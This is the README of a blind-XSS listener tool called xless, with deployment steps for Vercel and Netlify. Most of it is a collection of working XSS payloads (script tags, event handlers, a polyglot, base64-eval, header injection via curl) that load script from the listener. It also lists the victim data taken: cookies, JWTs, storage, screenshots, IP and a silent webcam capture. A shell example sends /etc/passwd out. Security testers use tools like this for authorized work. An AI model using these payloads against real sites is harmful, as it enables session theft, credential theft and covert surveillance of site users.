<h1 align="center">
  <br>
  <a href="https://github.com/L33T7/xlessbxss"><img src="https://user-images.githubusercontent.com/29874489/58731472-4f6c8080-83de-11e9-8206-992f4d777fdc.png" alt="Xless"></a>
  <br>
  xless
  <br>
</h1>

<h4 align="center">The Serverless Blind XSS App</h4>

<p align="center">
  <img src="https://img.shields.io/maintenance/yes/2026.svg?style=flat-square" alt="Maintained" />
  <img src="https://img.shields.io/github/last-commit/L33T7/xlessbxss.svg?style=flat-square" alt="Last Commit" />
</p>

## :information_source: About The Project
**Xless** is a serverless Blind XSS (bXSS) application that can be used to identify Blind XSS vulnerabilities using your own deployed version of the application.

Deploy to **Vercel** or **Netlify** in seconds — just configure your environment variables and run `bash deploy.sh`.

You'll get a fully-running Blind XSS listener that notifies you via **Discord**, **Slack**, and **Email** with rich formatting, screenshots, and extracted secrets.

## :warning: Requirements
* **Deployment Platform** (choose one):
  * [Vercel](https://vercel.com/) — free plan available
  * [Netlify](https://netlify.com/) — free plan available
* **Notification Channels** (all supported simultaneously):
  * 🔔 Discord Webhook URL
  * 💬 Slack Incoming Webhook URL
  * 📧 Email (SMTP — Gmail, Outlook, etc.)
* **Screenshot Hosting**:
  * [ImgBB](https://imgbb.com/) free account and API key

## :key: Environment Variables

| Variable                 | Required | Description                             |
| ------------------------ | -------- | --------------------------------------- |
| `IMGBB_API_KEY`          | ✅        | ImgBB API key for screenshot uploads    |
| `DISCORD_WEBHOOK_URL`    | ✅        | Discord webhook for alerts              |
| `SLACK_INCOMING_WEBHOOK` | ✅        | Slack webhook for alerts                |
| `EMAIL_HOST`             | ✅        | SMTP host (Gmail, Outlook, etc.)        |
| `EMAIL_PORT`             | ✅        | SMTP port (default: `587`)              |
| `EMAIL_USER`             | ✅        | SMTP username                           |
| `EMAIL_PASS`             | ✅        | SMTP password or app password           |
| `EMAIL_FROM`             | ✅        | From address (defaults to `EMAIL_USER`) |
| `EMAIL_TO`               | ✅        | Recipient email address                 |

> **Gmail Users**: Use an [App Password](https://myaccount.google.com/apppasswords) instead of your regular password. You need [2-Step Verification](https://myaccount.google.com/signinoptions/two-step-verification) enabled first.


## :rocket: Deployment

### Vercel (Recommended)

[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2FL33T7%2Fxlessbxss&env=IMGBB_API_KEY,DISCORD_WEBHOOK_URL,SLACK_INCOMING_WEBHOOK)

**Or via CLI:**
```bash
$ bash deploy.sh
# Select option 1 for Vercel

> Deploying ~/xless
> https://your-xless-app.vercel.app [v2] [4s]
> Success! Deployment ready
```

**Setting Environment Variables on Vercel:**
1. Go to [Vercel Dashboard](https://vercel.com/dashboard)
2. Select your xless project
3. Go to **Settings** → **Environment Variables**
4. Add the following variables:
   - `IMGBB_API_KEY` — your ImgBB API key
   - `DISCORD_WEBHOOK_URL` — your Discord webhook
   - `SLACK_INCOMING_WEBHOOK` — your Slack webhook
   - `EMAIL_HOST` — your SMTP server hostname
   - `EMAIL_PORT` — `587`
   - `EMAIL_USER` — your Gmail address
   - `EMAIL_PASS` — your Gmail [App Password](https://myaccount.google.com/apppasswords)
   - `EMAIL_TO` — recipient email for alerts
5. Click **Redeploy** to apply

### Netlify

```bash
$ bash deploy.sh
# Select option 2 for Netlify
```

Or deploy manually:
```bash
$ npx netlify-cli deploy --prod
```

Set environment variables in [Netlify Dashboard](https://app.netlify.com/) → Site → Site Configuration → Environment Variables.

### Local Development

```bash
$ cp .env.example .env    # Configure your keys
$ npm install
$ node index.js
> Ready On Server http://localhost:3000
```


## :speech_balloon: Example Payloads

> Replace `YOUR_XLESS_URL` with your deployed URL:
> - **Vercel**: `https://your-app.vercel.app`
> - **Netlify**: `https://your-app.netlify.app`

### Basic Script Tag
```html
<script src="https://YOUR_XLESS_URL"></script>
```

### Script Tag with Closing Quote Escape
```html
'"><script src="https://YOUR_XLESS_URL"></script>
```

### JavaScript URI (Bookmarklet / Href Injection)
```javascript
javascript:eval('var a=document.createElement("script");a.src="https://YOUR_XLESS_URL";document.body.appendChild(a)')
```

### XMLHttpRequest Loader
```html
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","https://YOUR_XLESS_URL");a.send();</script>
```

### jQuery (if available on target)
```html
<script>$.getScript("https://YOUR_XLESS_URL")</script>
```

### Fetch API
```html
<script>fetch("https://YOUR_XLESS_URL").then(r=>r.text()).then(eval)</script>
```

### IMG Tag with onerror
```html
<img src=x onerror="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
```

### SVG Tag
```html
<svg onload="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
```

### Input Tag with onfocus + autofocus
```html
<input onfocus="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)" autofocus>
```

### iframe Injection
```html
<iframe src="javascript:var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
```

### Event Handler Variants
```html
<body onload="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
<details open ontoggle="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
<marquee onstart="var s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)">
```

### Markdown Injection (for apps that render markdown)
```markdown
[Click me](javascript:eval\('var%20a=document.createElement\("script"\);a.src="https://YOUR_XLESS_URL";document.body.appendChild\(a\)'\))
```

### Polyglot Payload
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik%0telerik11telerik/telerik/*/</stYle/</telerik/</teleTelerik/</noeembed/</noscRipt/</seLect/</scRipt/--><sVg/telerik/oNloAd=var+s=document.createElement('script');s.src='https://YOUR_XLESS_URL';document.body.appendChild(s)//>
```

### Blind XSS in HTTP Headers (via curl)
```bash
# User-Agent injection
curl -A "<script src='https://YOUR_XLESS_URL'></script>" https://target.com

# Referer injection
curl -H "Referer: <script src='https://YOUR_XLESS_URL'></script>" https://target.com
```

### Payloads

<!-- Basic -->
```'"><script src="https://your-xless.netlify.app"></script>```

<!-- Via eval (currentScript fallback kicks in) -->
```javascript:eval('var a=document.createElement("script");a.src="https://your-xless.netlify.app";document.body.appendChild(a)')```

<!-- Event handler -->
```'" onfocus=eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veW91ci14bGVzcy5uZXRsaWZ5LmFwcCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKQ==')) autofocus=```

### OOB Callback Test
```bash
# Simple callback test to verify your listener is working
curl https://YOUR_XLESS_URL/test-callback
```

More payloads auto-generated at `https://YOUR_XLESS_URL/examples`


## :incoming_envelope: Collected Data

| Data                | Source                                | Description                   |
| ------------------- | ------------------------------------- | ----------------------------- |
| 🍪 Cookies           | `document.cookie`                     | All accessible cookies        |
| 🔑 JWT Tokens        | localStorage, sessionStorage, cookies | Auto-extracted using regex    |
| 📍 Location          | `window.location`                     | Full page URL                 |
| 📄 Document Domain   | `document.domain`                     | Target domain                 |
| 📄 Document Location | `document.location`                   | Full document URL             |
| 💻 User-Agent        | `navigator.userAgent`                 | Browser information           |
| ↩️ Referrer          | `document.referrer`                   | Referring page                |
| 🏠 Origin            | `location.origin`                     | Page origin                   |
| 🕐 Browser Time      | `Date()`                              | Victim's local time           |
| 💾 localStorage      | `localStorage`                        | All localStorage data         |
| 💾 sessionStorage    | `sessionStorage`                      | All sessionStorage data       |
| • DOM               | `document.documentElement`            | Page HTML (truncated)         |
| 🌐 Remote IP         | Request headers                       | Victim's IP address           |
| 📸 Screenshot        | html2canvas                           | Full page screenshot          |
| 📷 Webcam            | getUserMedia (silent)                 | Webcam photo (if pre-granted) |


## :bell: Notification Channels

All configured channels receive alerts **simultaneously** — no fallback logic.

### Discord
- Rich formatted messages with emojis and priority fields
- Screenshot sent as a separate embed with red accent
- Custom bot username and avatar

### Slack
- Block Kit formatted messages with header
- Screenshot displayed as full image block
- Custom bot name and icon

### Email
- HTML formatted email with dark theme
- Screenshot embedded as clickable image
- Subject includes target domain name (e.g. `🚨 XLess Blind XSS Alert — target.com`)


## :satellite: Out-of-Band (OOB) Callbacks Listener

Xless also works as an OOB (Out-of-Band) callbacks listener for HTTP/HTTPS requests. Any request to a non-parent path triggers a callback alert.

```bash
$ curl https://your-xless-app.vercel.app/callback-canary
```


## :man_health_worker: Health Check
Xless provides a `/health` endpoint to verify all services are configured correctly.

```bash
$ curl https://your-xless-app.vercel.app/health
```


## :envelope_with_arrow: Scriptable Messages

Use Xless to send direct messages to your listener:

```shell
# Add to your .bashrc / .zshrc:
function xless() {
  curl -s https://your-xless-app.vercel.app/message --data "text=$1"
}

# Usage:
xless "Data exfiltrated: $(cat /etc/passwd)"
```


## :gear: Project Structure

```
xless/
├── index.js              # Main server + notification logic
├── payload.js            # XSS payload (served to target)
├── package.json          # Dependencies
├── vercel.json           # Vercel configuration
├── netlify.toml          # Netlify configuration
├── netlify/functions/    # Netlify serverless wrapper
│   └── api.js
├── deploy.sh             # Multi-platform deploy script
├── test_xss.html         # Local test page
└── .env.example          # Environment variable template
```


## Contribution
Contribution is very welcome. Please share your ideas by GitHub issues and pull requests.

Ideas:
1. ~~Enabling sharing of page screenshot~~. ✅
2. ~~Scriptable messages~~. ✅
3. ~~Discord integration~~. ✅
4. ~~Email notifications~~. ✅
5. ~~Netlify deployment~~. ✅
6. ~~JWT token extraction~~. ✅
7. _Your idea of a new feature_?


## Acknowledgement

* [Matthew Bryant](https://github.com/mandatoryprogrammer) for the XSS Hunter project.
* [Mazin Ahmed](https://github.com/mazen160) for the original Xless project.
* [Rami Ahmed](https://twitter.com/rami_ahmad) for the "xless" name idea.
* [Damian Ebelties](https://twitter.com/DamianEbelties) for the logo.
* [Rotem Reiss](https://twitter.com/2rs3c) for the screenshot feature.
* [Vercel](https://vercel.com/) and [Netlify](https://netlify.com/) for serverless platforms.

## Awesome Similar Projects

* [Azure-xless](https://github.com/dgoumans/Azure-xless): An Xless implementation for Microsoft Azure Functions.


## Legal Disclaimer
This project is made for educational and ethical testing purposes only. Usage of xless for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.


## :email: Gmail Setup Guide

To use Gmail as your email notification channel:

1. **Enable 2-Step Verification**
   - Go to [Google 2-Step Verification](https://myaccount.google.com/signinoptions/two-step-verification)
   - Follow the prompts to enable it

2. **Generate an App Password**
   - Go to [Google App Passwords](https://myaccount.google.com/apppasswords)
   - Select **App** → "Other (Custom name)" → type `Xless`
   - Click **Generate**
   - Copy the 16-character password (e.g. `abcd efgh ijkl mnop`)

3. **Configure Environment Variables**
   ```env
   EMAIL_HOST=your-smtp-host
   EMAIL_PORT=587
   EMAIL_USER=youremail@gmail.com
   EMAIL_PASS=abcdefghijklmnop
   EMAIL_FROM=youremail@gmail.com
   EMAIL_TO=youremail@gmail.com
   ```

> **⚠️ Important:** Use the App Password, NOT your regular Gmail password. Regular passwords will be rejected by Google's SMTP.


## License
The project is currently licensed under MIT License.